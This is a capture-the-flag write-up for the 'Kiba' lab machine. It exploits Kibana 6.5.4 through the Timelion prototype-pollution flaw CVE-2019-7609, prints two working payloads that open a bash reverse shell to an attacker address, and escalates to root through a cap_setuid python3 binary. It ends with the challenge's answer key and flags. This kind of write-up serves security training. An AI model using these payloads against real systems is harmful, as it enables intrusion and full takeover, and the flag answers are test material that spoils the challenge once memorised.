# Kiba

Laurent Chauvin | April 12, 2024

## Resources

[1] https://github.com/mpgn/CVE-2019-7609
[2] https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities

## Progress

```
export IP=10.10.84.14
```

1. What is the vulnerability that is specific to programming languages with prototype-based inheritance?

```
Prototype pollution
```

2. What is the version of visualization dashboard installed in the server?

Nmap scan:

```bash
nmap -sC -sV -oN nmap/initial 10.10.84.14

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 18:39 EDT
Nmap scan report for 10.10.84.14
Host is up (0.091s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
```

Let's check the website. Not much to see there.

The challenge being called `Kiba` I did a research on `kiba dashboard` and found `Kibana`. Then I looked for `kibana dashboard url` and found that you have to connect to it on port 5601, which I did, and landed on the `kibana` dashboard. Not sure why nmap didn't pick it up.

Going to the 'Management' tab, we can find the version: `6.5.4`

3. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

Let's search for exploits, they will lead us to the CVE. Searchsploit didn't return much:

```bash
searchsploit Kibana 

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Kibana 6.6.1 - CSV Injection                                                                                                                                                                              | windows/webapps/47971.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

But a quick search on Google on 'Kibana 6.5.4 CVE' lead to [1].

4. Compromise the machine and locate user.txt

Let's get this payload. Going to `Timelion` tab in Kibana and using this payload (found in [1]):

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.6.31.49/12345 0>&1");process.exit()//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

and listening on port 12345:

```bash
nc -lnvp 12345

listening on [any] 12345 ...
connect to [10.6.31.49] from (UNKNOWN) [10.10.108.152] 44442
bash: cannot set terminal process group (946): Inappropriate ioctl for device                                       
bash: no job control in this shell                                                                                  
To run a command as administrator (user "root"), use "sudo <command>".                                              
See "man sudo_root" for details.                                                                                    
                                                                                                                    
kiba@ubuntu:/home/kiba/kibana/bin$ whoami
kiba
```

then executing the payload on Kibana. I had quite issues with the first payload, it was most of the time not working, for some reason.

So I tried the second payload, and it worked right away, no need to load the `Canvas` tab:
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.6.31.49/12345 0>&1\'");//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

Let's get the flag then:

```bash
kiba@ubuntu:/home/kiba/kibana/bin$ cat ../../user.txt

cat ../../user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```

Although this worked, I don't recommend this payloads. I had to try multiple times to get a shell, and it's not consistent. On top of that, loading `Timelion` and `Canvas` are terribly slow, and if I killed the shell by accident, the machine became unresponsive, or the exploit were not working anymore. It was just a pain. Instead I used `CVE-2019-7609-kibana-rce.py`. Much more stable and consistent, and doesn't freeze the VM.


5. Capabilities is a concept that provides a security system that allows "divide" root privileges into different values

6. How would you recursively list all of these capabilities?

From [2], we can see a binary called `getcap`, so let's try `getcap -r /`

7. Escalate privileges and obtain root.txt

From [2], we can see a way to use `setcap` to get root privileges, so I would assume it would work:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

Let's check first if there are not any already:

```bash
kiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2>/dev/null

/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

Hum, this line is interesting: `/home/kiba/.hackmeplease/python3 = cap_setuid+ep`. Could we spawn a shell from python ?

```bash
kiba@ubuntu:/home/kiba/kibana/bin$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash");'
     
whoami
root
cat /root/root.txt
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```

Sweet !!!

Interestingly, it doesn't appear when doing a search for SUID files:

```bash
kiba@ubuntu:/home/kiba/kibana/bin$ find / -user root -perm -u=s 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/bin/fusermount
```

Which is confirmed when looking at the python file:

```bash
kiba@ubuntu:/home/kiba/kibana/bin$ ls -al ../../.hackmeplease

total 4356
drwxrwxr-x 2 kiba kiba    4096 Mar 31  2020 .
drwxr-xr-x 6 kiba kiba    4096 Mar 31  2020 ..
-rwxr-xr-x 1 root root 4452016 Mar 31  2020 python3
```

## To Go Further

Initially `python3` is not SUID, but it has the capability of changing the UID of a process (`cap_setuid+ep`), where `+ep` means you’re adding the capability (“-” would remove it) as Effective and Permitted.
When calling `os.setuid(0)` set the UID of the current process to 0 (i.e. root), and spawn a bash with the same UID.

## Flag

1. `Prototype pollution`

2. `6.5.4`

3. `CVE-2019-7609`

4. `THM{1s_easy_pwn3d_k1bana_w1th_rce}`

5. `None`

6. `getcap -r /`

7. `THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}`
